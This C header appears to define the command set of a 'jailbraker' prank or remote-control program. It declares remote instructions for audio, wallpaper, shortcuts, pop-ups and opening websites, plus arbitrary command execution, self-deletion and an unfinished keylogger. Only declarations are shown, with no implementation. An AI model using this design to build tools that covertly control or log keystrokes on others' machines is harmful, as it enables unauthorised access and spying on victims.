#ifndef FUN
#define FUN

#include "../Main.h"

/*
    **********************
    * JB_Instruction set *
    **********************

    --optional arguments are market with -opt
    --instructions with no args have (void)
    --i:arg -> integer,  s:arg -> string
    -- -WIP -> Work In Progress

    0.  JB_DEACTIVE (void)
    1.  JB_FUN      (void)
    2.  JB_REMOVE   (void)

    3.  JB_VOLUME   (void)
    4.  JB_MUTE     (void)
    5.  JB_SZAMBO   [s:soundFile]

    6.  JB_SETWALL  [s:walpPath]
    7.  JB_SAVEWALL (void)
    8.  JB_LOADWALL (void)

    9.  JB_LINKMAKE [i:linkCount-opt def:100]
    10. JB_LINKDEL  (void)

    11. JB_OPENWEB  [s:site] [i:googleSearch-opt def:0] 
    12. JB_CDEJECT  (void)
    13. JB_POPUPW   [s:msg] [s:wTitle-opt def:JB]
    14. JB_POPUPA   [s:msg] [s:wTitle-opt def:JB]
    15. JB_EXEC     [s:cmd]
    16. JB_ROTATESCR[i:angle] (0-default, 1-90deg, 2-180deg, 3-270deg)  -WIP
    17. JB_CHANGERES[i:res] -WIP
    18. JB_LOGKEYS  (void)  -WIP
*/

typedef enum {
    /* --- Main --- */
    JB_DEACTIVE,    // Deactive jailbraker
    JB_FUN,         // FUN
    JB_REMOVE,      // Delete from pc completely

    /* --- Audio --- */
    JB_VOLUME,      // unmute and set system volume to 100
    JB_MUTE,        // set volume to 0
    JB_SZAMBO,      // play sound

    /* --- Wallpaper --- */
    JB_SETWALL,     // set wallpaper to an image
    JB_SAVEWALL,    // save current wallpaper
    JB_LOADWALL,    // load saved wallpaper

    /* --- Shortcuts --- */
    JB_LINKMAKE,    // create desktop shortcuts to onestop.midi
    JB_LINKDEL,     // delete all shortcuts

    /* --- Other --- */
    JB_OPENWEB,     // Open website or google search in default browser
    JB_CDEJECT,     // Eject disk drive
    JB_POPUPW,      // MessageBoxW
    JB_POPUPA,      // MessageBoxA
    JB_EXEC,        // execute a cmdlet
    JB_ROTATESCR,   // SetDisplayAutoRotationPreferences
    JB_CHANGERES,   // set screen resolution
    JB_LOGKEYS      // keylogging bruh.
} JB_Instruction;

typedef struct {
    char auth[AUTH_LENGTH];
    JB_Instruction cmd;
    char args[CMD_ARGSZ];
} JBCMD; // JailBreaker Command

void execCommand(JBCMD cmd); // star of the show

#endif